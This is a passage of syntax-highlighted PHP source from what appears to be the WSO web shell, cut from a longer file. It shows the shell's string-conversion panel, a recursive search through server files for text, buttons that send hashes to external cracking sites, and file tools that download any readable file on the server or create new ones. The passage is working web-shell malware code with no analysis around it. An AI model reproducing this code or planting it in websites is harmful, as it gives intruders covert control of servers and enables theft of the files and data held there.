    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;ascii2hex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">ascii2hex</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;full_urlencode&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">full_urlencode</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span><span class="nv">$r</span><span class="o">.=</span> <span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span><span class="k">return</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}}</span>
    <span class="nv">$stringTools</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">&#39;Base64 encode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;base64_encode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Base64 decode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;base64_decode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Url encode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;urlencode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Url decode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;urldecode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Full urlencode&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;full_urlencode&#39;</span><span class="p">,</span>
        <span class="s1">&#39;md5 hash&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;md5&#39;</span><span class="p">,</span>
        <span class="s1">&#39;sha1 hash&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;sha1&#39;</span><span class="p">,</span>
        <span class="s1">&#39;crypt&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;crypt&#39;</span><span class="p">,</span>
        <span class="s1">&#39;CRC32&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;crc32&#39;</span><span class="p">,</span>
        <span class="s1">&#39;ASCII to HEX&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;ascii2hex&#39;</span><span class="p">,</span>
        <span class="s1">&#39;HEX to ASCII&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;hex2ascii&#39;</span><span class="p">,</span>
        <span class="s1">&#39;HEX to DEC&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span>
        <span class="s1">&#39;HEX to BIN&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;hex2bin&#39;</span><span class="p">,</span>
        <span class="s1">&#39;DEC to HEX&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span>
        <span class="s1">&#39;DEC to BIN&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;decbin&#39;</span><span class="p">,</span>
        <span class="s1">&#39;BIN to HEX&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;binhex&#39;</span><span class="p">,</span>
        <span class="s1">&#39;BIN to DEC&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;bindec&#39;</span><span class="p">,</span>
        <span class="s1">&#39;String to lower case&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;strtolower&#39;</span><span class="p">,</span>
        <span class="s1">&#39;String to upper case&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;strtoupper&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Htmlspecialchars&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;htmlspecialchars&#39;</span><span class="p">,</span>
        <span class="s1">&#39;String length&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;strlen&#39;</span><span class="p">,</span>
    <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$stringTools</span><span class="p">))</span>
            <span class="k">echo</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="s2">&quot;document.getElementById(&#39;strOutput&#39;).style.display=&#39;&#39;;document.getElementById(&#39;strOutput&#39;).innerHTML=&#39;&quot;</span><span class="o">.</span><span class="nb">addcslashes</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">ob_get_clean</span><span class="p">()),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;String conversions&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form name=&#39;toolsForm&#39; onSubmit=&#39;if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;&#39;&amp;gt;&amp;lt;select name=&#39;selectTool&#39;&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$stringTools</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;/&amp;gt; &amp;lt;input type=checkbox name=ajax value=1 &quot;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; send using AJAX&amp;lt;br&amp;gt;&amp;lt;textarea name=&#39;input&#39; style=&#39;margin-top:5px&#39; class=bigarea&amp;gt;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;pre class=&#39;ml1&#39; style=&#39;&quot;</span><span class="o">.</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;display:none;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;margin-top:5px&#39; id=&#39;strOutput&#39;&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$stringTools</span><span class="p">))</span><span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">](</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]));</span>
    <span class="p">}</span>
    <span class="k">echo</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;Search text in files:&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;</span>

<span class="s2">       &amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;table cellpadding=&#39;1&#39; cellspacing=&#39;0&#39; width=&#39;50%&#39;&amp;gt;</span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td width=&#39;1%&#39;&amp;gt;Text:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;text&#39; style=&#39;width:100%&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Path:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;cwd&#39; value=&#39;&quot;</span><span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39; style=&#39;width:100%&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Name:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;filename&#39; value=&#39;*&#39; style=&#39;width:100%&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">           &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">           &amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>

    <span class="k">function</span> <span class="nf">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
            <span class="nv">$path</span><span class="o">.=</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
        <span class="nv">$paths</span> <span class="o">=</span> <span class="o">@</span><span class="nb">array_unique</span><span class="p">(</span><span class="o">@</span><span class="nb">array_merge</span><span class="p">(</span><span class="o">@</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]),</span> <span class="o">@</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="nx">GLOB_ONLYDIR</span><span class="p">)));</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$paths</span><span class="p">)</span><span class="o">&amp;&amp;@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$paths</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">foreach</span><span class="p">(</span><span class="nv">$paths</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$path</span><span class="o">!=</span><span class="nv">$item</span><span class="p">)</span>
                        <span class="nx">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$item</span><span class="p">),</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span>
                        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">view</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span>
        <span class="nx">wsoRecursiveGlob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;Search for hash:&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;</span>

<span class="s2">       &amp;lt;form method=&#39;post&#39; target=&#39;_blank&#39; name=&#39;hf&#39;&amp;gt;</span>
<span class="s2">           &amp;lt;input type=&#39;text&#39; name=&#39;hash&#39; style=&#39;width:200px;&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;hashcrack.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.hashcrack.com/index.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;milw0rm.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.milw0rm.com/cracker/search.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;hashcracking.info&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;https://hashcracking.info/index.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;md5.rednoize.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://md5.rednoize.com/?q=&#39;+document.hf.hash.value+&#39;&amp;s=md5&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">           &amp;lt;input type=&#39;button&#39; value=&#39;md5decrypter.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.md5decrypter.com/&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">       &amp;lt;/form&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionFilesTools</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
            <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mime_content_type&quot;</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: &quot;</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: application/octet-stream&quot;</span><span class="p">);</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span>
                    <span class="k">echo</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mkfile&#39;</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;edit&quot;</span><span class="p">;</span>
                <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;File tools&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;File not exists&#39;</span><span class="p">;</span>
        <span class="nx">wsoFooter</span><span class="p">();</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
        <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;Name:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Size:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">wsoViewSize</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">:</span><span class="s1">&#39;-&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Permission:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Owner/Group:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
